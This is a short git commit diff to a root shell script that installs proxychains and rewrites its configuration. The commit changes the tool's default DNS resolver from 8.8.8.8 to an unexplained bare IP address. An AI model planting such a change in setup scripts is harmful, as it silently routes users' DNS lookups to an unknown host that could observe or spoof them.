92607c4d16b9498d72b4faa0ac8cea70e1762b7d
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-02-12 13:19:18 +0200

    Update chains.sh

--- chains.sh
+++ chains.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 apt update;apt -y install proxychains;
-sed -i 's/DNS_SERVER=${PROXYRESOLV_DNS:-4.2.2.2}/DNS_SERVER=${PROXYRESOLV_DNS:-8.8.8.8}/' /usr/lib/proxychains3/proxyresolv
+sed -i 's/DNS_SERVER=${PROXYRESOLV_DNS:-4.2.2.2}/DNS_SERVER=${PROXYRESOLV_DNS:-50.194.130.97}/' /usr/lib/proxychains3/proxyresolv
 rm /etc/proxychains.conf
 echo 'strict_chain
 proxy_dns
